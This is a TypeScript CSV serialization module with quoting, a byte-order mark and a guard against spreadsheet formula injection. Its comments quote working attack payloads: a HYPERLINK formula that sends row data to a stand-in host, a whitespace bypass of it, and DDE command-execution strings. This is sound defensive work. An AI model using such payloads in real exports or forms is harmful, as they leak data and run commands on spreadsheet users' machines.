/**
 * CSV serialization — the ONE serializer for every export in the app.
 *
 * Promoted here from `apps/mobile/components/giving/csv.ts` (the giving grids'
 * client-side "export the current view" helper) because exports now also run
 * SERVER-side, inside Convex, where nothing under `apps/mobile` is importable.
 * That file is now a thin re-export so the two giving grids keep working and
 * there is exactly one quoting implementation in the repo.
 *
 * Two things this adds over the mobile original, both of which matter a great
 * deal more now that exported cells carry arbitrary user-typed text (person
 * names, notes, and above all free-text FORM ANSWERS):
 *
 *  1. FORMULA-INJECTION GUARD (`csvField`). A cell whose text begins with
 *     `=`, `+`, `-`, `@`, tab or CR is interpreted as a FORMULA by Excel,
 *     LibreOffice and Google Sheets. A form answer of
 *     `=HYPERLINK("http://evil.test?x="&A1,"click")` exfiltrates the row it
 *     lands next to the moment someone opens the file; `=cmd|'/c calc'!A0` is
 *     the DDE variant. Since we hand these files to humans who open them in
 *     exactly those programs, every STRING cell gets a leading apostrophe when
 *     it starts with one of those characters. Numbers and booleans are passed
 *     through untouched — they are not attacker-controlled text, and guarding
 *     them would corrupt every negative amount in a giving export.
 *  2. `CSV_BOM`. Excel on Windows assumes the ANSI code page for a .csv with
 *     no byte-order mark, so "José" arrives as "JosÃ©". Every file we WRITE
 *     is prefixed with the UTF-8 BOM; every parser we own already tolerates
 *     one (and `stripBom` is here for the ones that don't).
 *
 * Pure and dependency-free by design: it must load in the Convex isolate, in
 * jest under the mobile app, and in vitest under this package.
 */

export type CsvValue = string | number | boolean | null | undefined;

/** UTF-8 byte-order mark. Prefix every file we hand to a human — see the
 *  module doc for why (Excel mangles non-ASCII without it). */
export const CSV_BOM = "﻿";

/**
 * Characters that make a spreadsheet treat a cell as a formula rather than
 * text. `-` is included even though it also starts a negative number: this
 * guard only ever runs on STRING values (see `csvField`), so `-12.5` typed as
 * a number is unaffected, while the string `-2+3+cmd|' /c calc'!A0` is.
 *
 * LEADING WHITESPACE IS SKIPPED BEFORE THE TEST. Excel, LibreOffice and
 * Google Sheets all strip leading spaces/tabs when importing a CSV cell, so
 * `" =HYPERLINK(...)"` evaluates exactly like `"=HYPERLINK(...)"` — anchoring
 * strictly at index 0 let a single space defeat the whole guard. An
 * adversarial review demonstrated the bypass with a live exfiltration payload
 * (`" =HYPERLINK(""http://evil.test?leak=""&A1,""Click me"")"`) reaching the
 * file untouched, from nothing more privileged than a free-text form answer.
 */
const FORMULA_LEAD = /^[ \t\r\n]*[=+\-@\t\r]/;

/** True iff a *string* cell would be evaluated as a formula by Excel /
 *  LibreOffice / Google Sheets. Exported for tests and for any caller that
 *  wants to warn rather than rewrite. */
export function isFormulaInjection(value: string): boolean {
  return FORMULA_LEAD.test(value);
}

/**
 * Quote and neutralize a single CSV field.
 *
 * Quoting is RFC4180: a field is quoted whenever it contains a comma, a double
 * quote, or any line break, and an embedded `"` is doubled. `null`/`undefined`
 * serialize to the empty string.
 *
 * Neutralizing is the formula guard above, and it applies to STRINGS ONLY. A
 * guarded cell gains a leading `'` — the apostrophe every spreadsheet reads as
 * "the rest of this cell is literal text" — and is always quoted, so the
 * apostrophe cannot itself be re-interpreted.
 */
export function csvField(value: CsvValue): string {
  if (value === null || value === undefined) return "";

  let s = String(value);
  // Only user-typed TEXT can carry an injection; a real number/boolean cannot,
  // and prefixing those would corrupt negative currency amounts.
  if (typeof value === "string" && isFormulaInjection(s)) {
    s = `'${s}`;
  }
  if (/[",\r\n]/.test(s)) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

/** Serialize a header row + positional data rows. CRLF line endings (RFC4180,
 *  and what Excel expects), no trailing newline, no BOM — see `buildCsvFile`
 *  for the "give this to a human" wrapper that adds one. Rows are NOT padded:
 *  prefer `rowsToCsv` for anything with a dynamic column set. */
export function toCsv(headers: string[], rows: CsvValue[][]): string {
  const lines = [headers, ...rows].map((row) => row.map(csvField).join(","));
  return lines.join("\r\n");
}

/** A column in a keyed export: `key` addresses the value in each row record,
 *  `label` is the human header written to the file. */
export interface CsvColumn {
  key: string;
  label: string;
}

/**
 * Serialize KEYED rows against an explicit column list — the shape every
 * export builder emits.
 *
 * This exists because a people export's columns are DYNAMIC (one per form
 * question, discovered at run time from `formDefinitions`), and positional
 * arrays silently misalign the moment one builder forgets a cell: every column
 * after the gap shifts left and the file looks plausible while being wrong.
 * Projecting a `Record` onto the column list makes that failure structurally
 * impossible — a missing key is an empty cell, in the right column.
 */
export function rowsToCsv(
  columns: readonly CsvColumn[],
  rows: readonly Record<string, CsvValue>[],
): string {
  const headers = columns.map((c) => c.label);
  const body = rows.map((row) => columns.map((c) => row[c.key]));
  return toCsv(headers, body);
}

/** Serialize just the DATA rows of a keyed export, with no header line — for
 *  streaming a large export in pages, where only the first page writes headers.
 *  Returns "" for an empty page (never a stray line break). */
export function rowsToCsvBody(
  columns: readonly CsvColumn[],
  rows: readonly Record<string, CsvValue>[],
): string {
  if (rows.length === 0) return "";
  return rows
    .map((row) => columns.map((c) => csvField(row[c.key])).join(","))
    .join("\r\n");
}

/** The header line on its own, for the streaming/paged path above. */
export function csvHeaderLine(columns: readonly CsvColumn[]): string {
  return columns.map((c) => csvField(c.label)).join(",");
}

/** Wrap a finished CSV body as the bytes we actually hand to a human: UTF-8
 *  BOM + a trailing CRLF (a final newline keeps `wc -l`, `tail` and strict
 *  parsers happy; the BOM keeps Excel from mangling accents). */
export function buildCsvFile(csv: string): string {
  return `${CSV_BOM}${csv}\r\n`;
}

/** Drop a leading UTF-8 BOM, for parsers that would otherwise treat it as part
 *  of the first header name. */
export function stripBom(text: string): string {
  return text.startsWith(CSV_BOM) ? text.slice(1) : text;
}
